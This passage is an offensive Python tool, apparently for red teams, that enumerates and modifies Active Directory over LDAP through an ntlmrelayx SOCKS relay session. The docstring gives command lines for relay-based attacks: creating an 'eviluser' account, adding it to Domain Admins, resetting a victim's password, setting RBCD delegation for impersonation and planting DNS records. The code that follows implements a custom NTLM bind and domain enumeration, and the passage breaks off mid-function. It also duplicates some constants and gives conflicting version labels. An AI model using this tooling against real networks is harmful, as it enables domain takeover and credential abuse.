#!/usr/bin/env python3
"""
LDAP Enumeration and Modification via ntlmrelayx SOCKS5 Proxy

PURPOSE:
This script enables LDAP enumeration and modification through ntlmrelayx's SOCKS proxy
when standard tools fail. It replicates Certipy's LDAP connection method to work around
ntlmrelayx SOCKS5 LDAP implementation issues.

PROBLEM IT SOLVES:
When using ntlmrelayx with SOCKS5 proxying for LDAP sessions, most tools fail:
- impacket tools (GetADUsers, secretsdump, etc.) → "unknown LDAP binding request"
- bloodyAD → Connection closed / session terminated
- ldapdomaindump → Invalid messageId / socket receive errors
- NetExec/CrackMapExec → Index out of range errors
- Standard ldap3 scripts → Session terminated by server
- bloodhound-python → Cannot work via ntlmrelayx SOCKS

ROOT CAUSE:
ntlmrelayx's SOCKS5 LDAP proxy has limitations:
1. Only works with NTLM authentication (not anonymous or simple bind)
2. Requires SYNC strategy (not RESTARTABLE, ASYNC, etc.)
3. Needs paged_search() with generator=True for proper message sequencing
4. Standard search() operations get "invalid messageId" errors over SOCKS

WHY THIS SCRIPT WORKS:
This script uses the exact same ldap3 configuration as Certipy:
- NTLM authentication with DOMAIN\\username format
- Default SYNC client strategy (no custom strategies)
- paged_search() with generator=True for all queries
- Increased timeouts for SOCKS latency:
  * connect_timeout: 30s (connection establishment)
  * receive_timeout: 600s (10 minutes for large queries via SOCKS)
- auto_referrals=False to prevent connection issues

OUTPUT FORMATS:
1. BloodHound Legacy v4 (DEFAULT) - Compatible with BloodHound 4.2/4.3
2. BloodHound CE v5 (--bloodhound-ce) - For BloodHound Community Edition
3. BOFHound (--bofhound) - Single JSON for BOFHound tool

USAGE EXAMPLES:

ENUMERATION:
1. Default - BloodHound Legacy v5 format (most compatible):
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot
   # Creates: loot_bhlegacy_YYYYMMDD_HHMMSS/ with 7 JSON files
   # Import to BloodHound 4.2 or 4.3

2. BloodHound CE v6 format:
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot --bloodhound-ce
   # Creates: loot_bhce_YYYYMMDD_HHMMSS/ with 7 JSON files
   # Import to BloodHound CE (v5.0+)

3. BOFHound format (single JSON + text files):
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot --bofhound
   # Creates: loot_YYYYMMDD_HHMMSS.json + text files

4. Specific enumeration (Kerberoastable users only):
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --kerberoastable -o kerb

MODIFICATION (Active Directory Attacks):
5. Add new user:
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --add-user eviluser --add-user-pass 'P@ss123!'

6. Add computer account (for RBCD attacks):
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --add-computer EVIL01 --add-computer-pass 'P@ss123!'

7. Add user to Domain Admins:
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --add-user-to-group eviluser "Domain Admins"

8. Reset user password:
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --set-password victim 'NewP@ss!'

9. Set RBCD delegation (for impersonation attacks):
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --set-rbcd DC01 EVIL01$

10. Add DNS A record (for ADIDNS attacks):
    proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u admin --add-dns attacker 10.10.10.50

USAGE WITH NTLMRELAYX:
1. Start ntlmrelayx with SOCKS:
   ntlmrelayx.py -t ldap://dc.domain.local -socks

2. Capture/relay authentication to get LDAP session:
   ntlmrelayx> socks
   Protocol  Target     Username         AdminStatus  Port
   LDAP      10.10.10.10  DOMAIN/username  N/A          389

3. Run this script through proxychains:
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d DOMAIN -u username --all -o output

The script will automatically detect the base DN and enumerate users/computers.

ALTERNATIVE USE:
Can also be used for any LDAP enumeration when you have credentials, even without
SOCKS proxy - just run without proxychains.

ENUMERATION CAPABILITIES:
- Users (with UAC flags, SPNs, delegation, ACLs)
- Computers (with OS info, delegation, ACLs)
- Groups (with membership, ACLs)
- Domain trusts
- GPOs (with ACLs)
- OUs and Containers
- Kerberoastable accounts (users with SPNs)
- AS-REP roastable accounts (no preauth required)

MODIFICATION CAPABILITIES (like bloodyAD):
- Add User: Create new user accounts with password
- Add Computer: Create computer accounts with password and SPNs
- Add User to Group: Add users to groups (e.g., Domain Admins)
- Set Password: Reset/change user passwords
- Set RBCD: Configure Resource-Based Constrained Delegation for impersonation
- Add DNS: Add DNS A records to AD-Integrated DNS zones

LIMITATIONS:
- ACLs collected as base64 (not parsed into BloodHound relationships)
- No group membership resolution (Members array empty)
- No attack path discovery without ACL parsing
- Works via ntlmrelayx SOCKS where bloodhound-python fails

CREDITS:
- LDAP connection method based on Certipy's implementation by ly4k
  https://github.com/ly4k/Certipy
- LDAP modification operations based on bloodyAD by CravateRouge
  https://github.com/CravateRouge/bloodyAD
"""


from ldap3 import Server, Connection, NTLM, SUBTREE, ALL_ATTRIBUTES, MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE
from ldap3.core.results import RESULT_SUCCESS
from ldap3.protocol import rfc4511
from ldap3.strategy.base import BaseStrategy
from ldap3.utils.asn1 import encode as ldap3_encode
import ldap3.strategy.sync
import sys
import argparse
import json
import base64
import ssl
import hashlib
import struct
import random
import string
import calendar
import time
import socket
import ipaddress
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, List, Optional, Tuple, cast

# Impacket imports for NTLM
from impacket.ntlm import (
    AV_PAIRS,
    KXKEY,
    MAC,
    NTLMSSP_AV_DNS_HOSTNAME,
    NTLMSSP_AV_TARGET_NAME,
    NTLMSSP_AV_TIME,
    NTLMSSP_NEGOTIATE_56,
    NTLMSSP_NEGOTIATE_128,
    NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
    NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY,
    NTLMSSP_NEGOTIATE_KEY_EXCH,
    NTLMSSP_NEGOTIATE_NTLM,
    NTLMSSP_NEGOTIATE_SEAL,
    NTLMSSP_NEGOTIATE_SIGN,
    NTLMSSP_NEGOTIATE_TARGET_INFO,
    NTLMSSP_NEGOTIATE_UNICODE,
    NTLMSSP_NEGOTIATE_VERSION,
    NTLMSSP_REQUEST_TARGET,
    SEAL,
    SEALKEY,
    SIGNKEY,
    NTLMAuthChallenge,
    NTLMAuthChallengeResponse,
    NTLMAuthNegotiate,
    NTLMMessageSignature,
    NTOWFv2,
    generateEncryptedSessionKey,
    hmac_md5,
)

# Crypto imports
try:
    from Cryptodome.Cipher import ARC4
except ImportError:
    from Crypto.Cipher import ARC4

def get_channel_binding_data(server_cert: bytes) -> bytes:
    """
    Generate channel binding token (CBT) from a server certificate.

    This implements the tls-server-end-point channel binding type as described
    in RFC 5929 section 4. The binding token is created by:
    1. Hashing the server certificate with SHA-256
    2. Creating a channel binding structure with the hash
    3. Computing an MD5 hash of the structure

    Args:
        server_cert: Raw server certificate bytes

    Returns:
        MD5 hash of the channel binding structure (16 bytes)

    References:
        - RFC 5929: https://datatracker.ietf.org/doc/html/rfc5929#section-4
    """
    # Hash the certificate with SHA-256 as required by the RFC
    cert_hash = hashlib.sha256(server_cert).digest()

    # Initialize the channel binding structure with empty addresses
    # These fields are defined in the RFC but not used for TLS bindings
    initiator_address = b"\x00" * 8
    acceptor_address = b"\x00" * 8

    # Create the application data with the "tls-server-end-point:" prefix
    application_data_raw = b"tls-server-end-point:" + cert_hash

    # Add the length prefix to the application data (little-endian 32-bit integer)
    len_application_data = len(application_data_raw).to_bytes(
        4, byteorder="little", signed=False
    )
    application_data = len_application_data + application_data_raw

    # Assemble the complete channel binding structure
    channel_binding_struct = initiator_address + acceptor_address + application_data

    # Return the MD5 hash of the structure
    return hashlib.md5(channel_binding_struct).digest()


def get_channel_binding_data_from_ssl_socket(ssl_socket: ssl.SSLSocket) -> bytes:
    """
    Extract channel binding data from an SSL socket.

    This function extracts the server certificate from an SSL socket
    and generates the channel binding token used for authentication.

    Args:
        ssl_socket: The SSL socket object containing TLS connection information

    Returns:
        The channel binding token as bytes

    Raises:
        ValueError: If unable to extract required TLS information from the socket
    """
    # Get the peer/server certificate in binary (DER) format
    peer_cert = ssl_socket.getpeercert(True)

    if peer_cert is None:
        raise ValueError(
            "No peer certificate found in SSL socket - server may not have presented a certificate"
        )

    # Generate and return channel binding data using the server certificate
    return get_channel_binding_data(peer_cert)


# NTLM Constants
NTLMSSP_AV_CHANNEL_BINDINGS = 0x0A


def compute_response(
    server_challenge: bytes,
    client_challenge: bytes,
    target_info: bytes,
    domain: str,
    user: str,
    password: str,
    nt_hash: str = "",
    channel_binding_data: Optional[bytes] = None,
    service: str = "LDAP",
) -> Tuple[bytes, bytes, bytes, bytes]:
    """
    Compute NTLMv2 response based on the provided parameters.

    Args:
        server_challenge: Challenge received from the server
        client_challenge: Client-generated random challenge
        target_info: Target information provided by the server
        domain: Domain name for authentication
        user: Username for authentication
        password: Password for authentication
        nt_hash: NT hash if available, otherwise password will be used
        channel_binding_data: Channel binding data for EPA compliance
        service: Service name for the SPN (default: LDAP)

    Returns:
        Tuple containing NT response, LM response, session base key, target hostname
    """
    # Generate response key
    response_key_nt = NTOWFv2(user, password, domain, bytes.fromhex(nt_hash) if nt_hash else "")  # type: ignore
    av_pairs = AV_PAIRS(target_info)

    # Add SPN (target name)
    if av_pairs[NTLMSSP_AV_DNS_HOSTNAME] is None:
        raise ValueError("NTLMSSP_AV_DNS_HOSTNAME not found in target info")

    hostname = cast(Tuple[int, bytes], av_pairs[NTLMSSP_AV_DNS_HOSTNAME])[1]
    spn = f"{service}/".encode("utf-16le") + hostname
    av_pairs[NTLMSSP_AV_TARGET_NAME] = spn

    # Add timestamp if not already present
    if av_pairs[NTLMSSP_AV_TIME] is None:
        timestamp = struct.pack(
            "<q", (116444736000000000 + calendar.timegm(time.gmtime()) * 10000000)
        )
        av_pairs[NTLMSSP_AV_TIME] = timestamp

    # Add channel bindings if provided
    if channel_binding_data:
        av_pairs[NTLMSSP_AV_CHANNEL_BINDINGS] = channel_binding_data

    # Construct temp data for NT proof calculation
    temp = (
        b"\x01"  # RespType
        + b"\x01"  # HiRespType
        + b"\x00" * 2  # Reserved1
        + b"\x00" * 4  # Reserved2
        + cast(Tuple[int, bytes], av_pairs[NTLMSSP_AV_TIME])[1]  # Timestamp
        + client_challenge  # ChallengeFromClient
        + b"\x00" * 4  # Reserved
        + av_pairs.getData()  # AvPairs
    )

    # Calculate response components
    nt_proof_str = hmac_md5(response_key_nt, server_challenge + temp)
    nt_challenge_response = nt_proof_str + temp
    lm_challenge_response = (
        hmac_md5(response_key_nt, server_challenge + client_challenge)
        + client_challenge
    )
    session_base_key = hmac_md5(response_key_nt, nt_proof_str)

    # Handle anonymous authentication
    if not user and not password:
        nt_challenge_response = b""
        lm_challenge_response = b""

    return nt_challenge_response, lm_challenge_response, session_base_key, hostname


def ntlm_negotiate(
    signing_required: bool = False,
    use_ntlmv2: bool = True,
) -> NTLMAuthNegotiate:
    """
    Generate an NTLMSSP Type 1 negotiation message.

    Args:
        signing_required: Whether signing is required for the connection
        use_ntlmv2: Whether to use NTLMv2 (should be True for modern systems)

    Returns:
        NTLMAuthNegotiate object representing the Type 1 message
    """
    # Create base negotiate message with standard flags
    auth = NTLMAuthNegotiate()
    auth["flags"] = (
        NTLMSSP_NEGOTIATE_NTLM
        | NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        | NTLMSSP_NEGOTIATE_UNICODE
        | NTLMSSP_REQUEST_TARGET
        | NTLMSSP_NEGOTIATE_128
        | NTLMSSP_NEGOTIATE_56
    )

    # Add security flags if signing is required
    if signing_required:
        auth["flags"] |= (
            NTLMSSP_NEGOTIATE_KEY_EXCH
            | NTLMSSP_NEGOTIATE_SIGN
            | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            | NTLMSSP_NEGOTIATE_SEAL
        )

    # Add NTLMv2 target info flag
    if use_ntlmv2:
        auth["flags"] |= NTLMSSP_NEGOTIATE_TARGET_INFO

    return auth


def ntlm_authenticate(
    type1: NTLMAuthNegotiate,
    challenge: NTLMAuthChallenge,
    user: str,
    password: str,
    domain: str,
    nt_hash: str = "",
    channel_binding_data: Optional[bytes] = None,
    service: str = "LDAP",
) -> Tuple[NTLMAuthChallengeResponse, bytes, int]:
    """
    Generate an NTLMSSP Type 3 authentication message in response to a server challenge.

    Args:
        type1: The Type 1 negotiate message that was sent
        challenge: The Type 2 challenge message received from the server
        user: Username for authentication
        password: Password for authentication
        domain: Domain name for authentication
        nt_hash: NT hash if available, otherwise password will be used
        channel_binding_data: Channel binding data for EPA compliance
        service: Service name for the SPN (default: LDAP)

    Returns:
        Tuple containing Type 3 message, exported session key, negotiated flags
    """
    # Get response flags from the initial negotiate message
    response_flags = type1["flags"]

    # Generate client challenge (8 random bytes)
    client_challenge = struct.pack("<Q", random.getrandbits(64))

    # Extract target info from the challenge
    target_info = challenge["TargetInfoFields"]

    # Compute the NTLM response components
    nt_response, lm_response, session_base_key, hostname = compute_response(
        challenge["challenge"],
        client_challenge,
        target_info,
        domain,
        user,
        password,
        nt_hash,
        channel_binding_data,
        service,
    )

    # Adjust response flags based on server capabilities
    security_flags = [
        NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY,
        NTLMSSP_NEGOTIATE_128,
        NTLMSSP_NEGOTIATE_KEY_EXCH,
        NTLMSSP_NEGOTIATE_SEAL,
        NTLMSSP_NEGOTIATE_SIGN,
        NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
    ]

    for flag in security_flags:
        if not (challenge["flags"] & flag):
            response_flags &= ~flag

    # Calculate the key exchange key
    key_exchange_key = KXKEY(
        challenge["flags"],
        session_base_key,
        lm_response,
        challenge["challenge"],
        password,
        "",
        nt_hash,
        True,
    )

    # Handle key exchange if required
    if challenge["flags"] & NTLMSSP_NEGOTIATE_KEY_EXCH:
        # Generate random session key
        exported_session_key = "".join(
            random.choices(string.ascii_letters + string.digits, k=16)
        ).encode()
        encrypted_random_session_key = generateEncryptedSessionKey(
            key_exchange_key, exported_session_key
        )
    else:
        encrypted_random_session_key = None
        exported_session_key = key_exchange_key

    # Create and populate the challenge response
    challenge_response = NTLMAuthChallengeResponse(
        user, password, challenge["challenge"]
    )
    challenge_response["flags"] = response_flags
    challenge_response["domain_name"] = domain.encode("utf-16le")
    challenge_response["host_name"] = hostname
    challenge_response["lanman"] = lm_response if lm_response else b"\x00"
    challenge_response["ntlm"] = nt_response

    # Add session key if key exchange is enabled
    if encrypted_random_session_key:
        challenge_response["session_key"] = encrypted_random_session_key

    return challenge_response, exported_session_key, response_flags


class NTLMCipher:
    """
    NTLM cipher for encrypting and decrypting LDAP messages when LDAP signing/sealing is enabled.
    """
    def __init__(self, flags: int, session_key: bytes):
        self.flags = flags

        # Same key for everything initially
        self.client_sign_key = session_key
        self.server_sign_key = session_key
        self.client_seal_key = session_key
        cipher = ARC4.new(self.client_sign_key)
        self.client_seal = cipher.encrypt
        self.server_seal = cipher.encrypt

        if self.flags & NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
            self.client_sign_key = cast(bytes, SIGNKEY(self.flags, session_key))
            self.server_sign_key = cast(
                bytes, SIGNKEY(self.flags, session_key, "Server")
            )
            self.client_seal_key = SEALKEY(self.flags, session_key)
            self.server_seal_key = SEALKEY(self.flags, session_key, "Server")

            client_cipher = ARC4.new(self.client_seal_key)
            self.client_seal = client_cipher.encrypt
            server_cipher = ARC4.new(self.server_seal_key)
            self.server_seal = server_cipher.encrypt

        self.sequence = 0

    def encrypt(self, plain_data: bytes) -> Tuple[NTLMMessageSignature, bytes]:
        """Encrypt data for sending to server."""
        message, signature = SEAL(
            self.flags,
            self.client_sign_key,
            self.client_seal_key,
            plain_data,
            plain_data,
            self.sequence,
            self.client_seal,
        )
        self.sequence += 1
        return signature, message

    def decrypt(self, answer: bytes) -> Tuple[NTLMMessageSignature, bytes]:
        """Decrypt data received from server."""
        answer, signature = SEAL(
            self.flags,
            self.server_sign_key,
            self.server_seal_key,
            answer[:16],
            answer[16:],
            self.sequence,
            self.server_seal,
        )
        return signature, answer


class ExtendedStrategy(ldap3.strategy.sync.SyncStrategy):
    """
    Extended strategy class for LDAP connections with encryption support.

    This class extends the default SyncStrategy to provide custom
    sending and receiving methods for LDAP messages with NTLM encryption.
    """

    def __init__(self, connection: "ExtendedLdapConnection") -> None:
        """Initialize the extended strategy with a connection."""
        super().__init__(connection)
        self._connection = connection
        # Override the default receiving method to use the custom implementation
        self.receiving = self._receiving
        self.sequence_number = 0

    def sending(self, ldap_message: Any) -> None:
        """Send an LDAP message, optionally encrypting it first."""
        try:
            encoded_message = cast(bytes, ldap3_encode(ldap_message))

            # Encrypt the message if required and not in SASL progress
            if self._connection.should_encrypt and not self.connection.sasl_in_progress:
                encoded_message = self._connection._encrypt(encoded_message)
                self.sequence_number += 1

            self.connection.socket.sendall(encoded_message)
        except socket.error as e:
            self.connection.last_error = f"socket sending error: {e}"
            print(f"[!] Failed to send LDAP message: {e}", file=sys.stderr)
            raise

        # Update usage statistics if enabled
        if self.connection.usage:
            self.connection._usage.update_transmitted_message(
                self.connection.request, len(encoded_message)
            )

    def _receiving(self) -> List[bytes]:  # type: ignore
        """Receive data over the socket and handle message encryption/decryption."""
        messages = []
        receiving = True
        unprocessed = b""
        data = b""
        get_more_data = True
        sasl_total_bytes_received = 0
        sasl_received_data = b""
        sasl_next_packet = b""
        sasl_buffer_length = -1

        while receiving:
            if get_more_data:
                try:
                    data = self.connection.socket.recv(self.socket_size)
                except (OSError, socket.error, AttributeError) as e:
                    self.connection.last_error = f"error receiving data: {e}"
                    try:
                        self.close()
                    except (socket.error, Exception):
                        pass
                    print(f"[!] Failed to receive LDAP message: {e}", file=sys.stderr)
                    raise

                # Handle encrypted messages (from NTLM)
                if (
                    self._connection.should_encrypt
                    and not self.connection.sasl_in_progress
                ):
                    data = sasl_next_packet + data

                    if sasl_received_data == b"" or sasl_next_packet:
                        # Get the size of the encrypted message
                        sasl_buffer_length = int.from_bytes(data[0:4], "big")
                        data = data[4:]
                    sasl_next_packet = b""
                    sasl_total_bytes_received += len(data)
                    sasl_received_data += data

                    # Check if we have received the complete encrypted message
                    if sasl_total_bytes_received >= sasl_buffer_length:
                        # Handle multi-packet SASL messages
                        sasl_next_packet = sasl_received_data[sasl_buffer_length:]

                        # Decrypt the received message
                        sasl_received_data = self._connection._decrypt(
                            sasl_received_data[:sasl_buffer_length]
                        )
                        sasl_total_bytes_received = 0
                        unprocessed += sasl_received_data
                        sasl_received_data = b""
                else:
                    unprocessed += data

            if len(data) > 0:
                # Try to compute the message length
                length = BaseStrategy.compute_ldap_message_size(unprocessed)

                if length == -1:  # too few data to decode message length
                    get_more_data = True
                    continue

                if len(unprocessed) < length:
                    get_more_data = True
                else:
                    messages.append(unprocessed[:length])
                    unprocessed = unprocessed[length:]
                    get_more_data = False
                    if len(unprocessed) == 0:
                        receiving = False
            else:
                receiving = False

        return messages


class ExtendedLdapConnection(ldap3.Connection):
    """
    Extended LDAP connection class with support for NTLM encryption and channel binding.

    This class extends ldap3.Connection to provide custom NTLM bind with channel binding support.
    """

    def __init__(
        self,
        *args: Any,
        use_channel_binding: bool = False,
        use_signing: bool = False,
        use_ssl: bool = False,
        target_domain: str = "",
        target_user: str = "",
        target_password: str = "",
        target_nthash: str = "",
        **kwargs: Any
    ) -> None:
        """Initialize an extended LDAP connection."""
        super().__init__(*args, **kwargs)

        # Replace standard strategy with extended strategy
        self.strategy = ExtendedStrategy(self)

        # Store connection properties
        self.use_channel_binding = use_channel_binding
        self.use_signing = use_signing
        self.use_ssl = use_ssl
        self.target_domain = target_domain
        self.target_user = target_user
        self.target_password = target_password
        self.target_nthash = target_nthash
        self.negotiated_flags = 0

        # Encryption-related attributes
        self.ntlm_cipher: Optional[NTLMCipher] = None
        self.should_encrypt = False

        # Alias important methods from strategy for direct access
        self.send = self.strategy.send
        self.open = self.strategy.open
        self.get_response = self.strategy.get_response
        self.post_send_single_response = self.strategy.post_send_single_response
        self.post_send_search = self.strategy.post_send_search

    def _encrypt(self, data: bytes) -> bytes:
        """Encrypt LDAP message data using NTLM cipher."""
        if self.ntlm_cipher is not None:
            # NTLM encryption
            signature, data = self.ntlm_cipher.encrypt(data)
            data = signature.getData() + data
            data = len(data).to_bytes(4, byteorder="big", signed=False) + data
        return data

    def _decrypt(self, data: bytes) -> bytes:
        """Decrypt LDAP message data using NTLM cipher."""
        if self.ntlm_cipher is not None:
            # NTLM decryption
            _, data = self.ntlm_cipher.decrypt(data)
        return data

    def do_ntlm_bind(self, controls: Any = None) -> dict:
        """
        Perform NTLM bind operation with optional channel binding and signing.

        This method implements the complete NTLM authentication flow:
        1. Sicily package discovery to verify NTLM support
        2. NTLM negotiate message exchange
        3. Challenge/response handling with optional channel binding
        4. Session key establishment and encryption setup

        Returns:
            Result of the bind operation
        """
        self.last_error = None  # type: ignore

        with self.connection_lock:
            if not self.sasl_in_progress:
                self.sasl_in_progress = True
                try:
                    # Step 1: Sicily package discovery to check for NTLM support
                    request = rfc4511.BindRequest()
                    request["version"] = rfc4511.Version(self.version)
                    request["name"] = ""
                    request[
                        "authentication"
                    ] = rfc4511.AuthenticationChoice().setComponentByName(
                        "sicilyPackageDiscovery", rfc4511.SicilyPackageDiscovery("")
                    )

                    response = self.post_send_single_response(
                        self.send("bindRequest", request, controls)
                    )

                    result = response[0]

                    if "server_creds" not in result:
                        raise Exception(
                            "Server did not return available authentication packages"
                        )

                    # Check if NTLM is supported
                    sicily_packages = result["server_creds"].decode().split(";")
                    if "NTLM" not in sicily_packages:
                        print(
                            f"[!] NTLM authentication not available. Supported: {sicily_packages}",
                            file=sys.stderr
                        )
                        raise Exception("NTLM not available on server")

                    # Step 2: Send NTLM negotiate message
                    use_signing = self.use_signing and not self.use_ssl
                    print(f"[*] NTLM signing: {use_signing} (Signing: {self.use_signing}, SSL: {self.use_ssl})", file=sys.stderr)

                    negotiate = ntlm_negotiate(use_signing)

                    request = rfc4511.BindRequest()
                    request["version"] = rfc4511.Version(self.version)
                    request["name"] = "NTLM"
                    request[
                        "authentication"
                    ] = rfc4511.AuthenticationChoice().setComponentByName(
                        "sicilyNegotiate", rfc4511.SicilyNegotiate(negotiate.getData())
                    )

                    response = self.post_send_single_response(
                        self.send("bindRequest", request, controls)
                    )

                    result = response[0]

                    if result["result"] != RESULT_SUCCESS:
                        print(f"[!] NTLM negotiate failed: {result}", file=sys.stderr)
                        return result

                    if "server_creds" not in result:
                        raise Exception(
                            "Server did not return NTLM challenge"
                        )

                    # Step 3: Process challenge and prepare authenticate response
                    challenge = NTLMAuthChallenge()
                    challenge.fromString(result["server_creds"])

                    channel_binding_data = None
                    use_channel_binding = self.use_channel_binding and self.use_ssl

                    print(f"[*] Channel binding: {use_channel_binding} (Enabled: {self.use_channel_binding}, SSL: {self.use_ssl})", file=sys.stderr)

                    if use_channel_binding:
                        if not isinstance(self.socket, ssl.SSLSocket):
                            raise Exception(
                                "LDAP server is using SSL but connection is not an SSL socket"
                            )

                        print("[*] Extracting channel binding data from SSL socket", file=sys.stderr)

                        # Extract channel binding data from SSL socket
                        channel_binding_data = get_channel_binding_data_from_ssl_socket(
                            self.socket
                        )

                    # Generate NTLM authenticate message
                    challenge_response, session_key, negotiated_flags = (
                        ntlm_authenticate(
                            negotiate,
                            challenge,
                            self.target_user,
                            self.target_password or "",
                            self.target_domain,
                            self.target_nthash,
                            channel_binding_data=channel_binding_data,
                        )
                    )

                    # Step 4: Set up encryption if negotiated
                    self.negotiated_flags = negotiated_flags
                    self.should_encrypt = (
                        negotiated_flags & NTLMSSP_NEGOTIATE_SEAL
                        == NTLMSSP_NEGOTIATE_SEAL
                    )

                    if self.should_encrypt:
                        print("[*] NTLM encryption enabled", file=sys.stderr)
                        self.ntlm_cipher = NTLMCipher(
                            negotiated_flags,
                            session_key,
                        )

                    # Step 5: Complete authentication with the NTLM authenticate message
                    request = rfc4511.BindRequest()
                    request["version"] = rfc4511.Version(self.version)
                    request["name"] = ""
                    request[
                        "authentication"
                    ] = rfc4511.AuthenticationChoice().setComponentByName(
                        "sicilyResponse",
                        rfc4511.SicilyResponse(challenge_response.getData()),
                    )

                    response = self.post_send_single_response(
                        self.send("bindRequest", request, controls)
                    )

                    result = response[0]

                    if result["result"] != RESULT_SUCCESS:
                        print(f"[!] LDAP NTLM authentication failed: {result}", file=sys.stderr)
                    else:
                        print("[+] LDAP NTLM authentication successful", file=sys.stderr)

                    return result
                finally:
                    self.sasl_in_progress = False
            else:
                raise Exception("SASL authentication already in progress")


# BloodHound Legacy trust mappings (integers, not strings)
TRUST_DIRECTION_MAP = {
    "Disabled": 0,
    "Inbound": 1, 
    "Outbound": 2,
    "Bidirectional": 3
}

TRUST_TYPE_MAP = {
    "Downlevel": 1,
    "Uplevel": 2,
    "ParentChild": 2,  # Same as Uplevel
    "MIT": 3,
    "DCE": 4,
    "External": 2  # Treat as Uplevel
}

# Collection method bitmasks for BloodHound Legacy v4
# DCOnly = Group + Trusts + ACL + ObjectProps + Container
COLLECTION_METHOD_GROUP = 2
COLLECTION_METHOD_TRUSTS = 8
COLLECTION_METHOD_ACL = 128
COLLECTION_METHOD_OBJECTPROPS = 1024
COLLECTION_METHOD_CONTAINER = 2048
DCONLY_BITMASK = (COLLECTION_METHOD_GROUP | COLLECTION_METHOD_TRUSTS | 
                  COLLECTION_METHOD_ACL | COLLECTION_METHOD_OBJECTPROPS | 
                  COLLECTION_METHOD_CONTAINER)  # = 3210

def sanitize_for_json(obj):
    """
    Recursively convert bytes objects to base64 strings for JSON serialization
    """
    if isinstance(obj, bytes):
        return base64.b64encode(obj).decode('utf-8')
    elif isinstance(obj, dict):
        return {k: sanitize_for_json(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [sanitize_for_json(item) for item in obj]
    else:
        return obj

def safe_json_dump(data, file_obj, **kwargs):
    """
    Safely dump data to JSON, converting any bytes to base64 strings
    """
    sanitized_data = sanitize_for_json(data)
    json.dump(sanitized_data, file_obj, **kwargs)  # Use json.dump, not safe_json_dump!

# BloodHound Legacy trust value mappings
TRUST_DIRECTION_MAP = {
    "Disabled": 0,
    "Inbound": 1,
    "Outbound": 2,
    "Bidirectional": 3,
    "Unknown": 0
}

TRUST_TYPE_MAP = {
    "Downlevel": 1,
    "Uplevel": 2,
    "MIT": 3,
    "DCE": 4,
    "Unknown": 2
}

# DCOnly collection method bitmask for BloodHound Legacy
# Group=2, Trusts=8, ACL=128, ObjectProps=1024, Container=2048
DCONLY_BITMASK = 2 + 8 + 128 + 1024 + 2048  # = 3210

def get_base_dn(conn, domain):
    """
    Auto-detect base DN from rootDSE or construct from domain name
    """
    try:
        # Try to get defaultNamingContext from rootDSE
        conn.search(
            search_base='',
            search_filter='(objectClass=*)',
            search_scope='BASE',
            attributes=['defaultNamingContext', 'namingContexts']
        )
        
        if conn.entries:
            entry = conn.entries[0]
            if hasattr(entry, 'defaultNamingContext') and entry.defaultNamingContext:
                base_dn = str(entry.defaultNamingContext)
                print(f"[+] Detected base DN from rootDSE: {base_dn}")
                return base_dn
    except Exception as e:
        print(f"[!] Could not query rootDSE: {e}")
    
    # Fall back to constructing from domain name
    if domain:
        # Convert DOMAIN to DC=domain,DC=local or similar
        # Handle both "DOMAIN" and "domain.local" formats
        if '.' in domain:
            parts = domain.split('.')
        else:
            # Assume single-part domain, add .local
            parts = [domain, 'local']
        
        base_dn = ','.join([f'DC={part}' for part in parts])
        print(f"[*] Constructed base DN from domain: {base_dn}")
        return base_dn
    
    return None

def get_domain_info(conn, base_dn):
    """Get domain functional level, MAQ, password policy"""
    try:
        info = {}
        
        # Query domain object
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=domain)',
            search_scope='BASE',
            attributes=['msDS-Behavior-Version', 'ms-DS-MachineAccountQuota', 
                       'minPwdLength', 'pwdHistoryLength', 'lockoutThreshold',
                       'maxPwdAge', 'minPwdAge', 'lockoutDuration', 'name'],
            paged_size=10,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            
            # Forest/Domain Functional Level
            if 'msDS-Behavior-Version' in attrs:
                level = attrs['msDS-Behavior-Version']
                if isinstance(level, list):
                    level = level[0] if level else 0
                level_map = {
                    0: "2000", 1: "2003 Interim", 2: "2003",
                    3: "2008", 4: "2008 R2", 5: "2012",
                    6: "2012 R2", 7: "2016", 10: "2025"
                }
                info['functional_level'] = level_map.get(level, f"Unknown ({level})")
            
            # Machine Account Quota
            if 'ms-DS-MachineAccountQuota' in attrs:
                maq = attrs['ms-DS-MachineAccountQuota']
                if isinstance(maq, list):
                    maq = maq[0] if maq else 0
                info['machine_account_quota'] = maq
            
            # Password Policy
            if 'minPwdLength' in attrs:
                info['min_pwd_length'] = attrs['minPwdLength'][0] if isinstance(attrs['minPwdLength'], list) else attrs['minPwdLength']
            if 'pwdHistoryLength' in attrs:
                info['pwd_history_length'] = attrs['pwdHistoryLength'][0] if isinstance(attrs['pwdHistoryLength'], list) else attrs['pwdHistoryLength']
            if 'lockoutThreshold' in attrs:
                info['lockout_threshold'] = attrs['lockoutThreshold'][0] if isinstance(attrs['lockoutThreshold'], list) else attrs['lockoutThreshold']
            
            if 'name' in attrs:
                info['domain_name'] = attrs['name'][0] if isinstance(attrs['name'], list) else attrs['name']
        
        return info
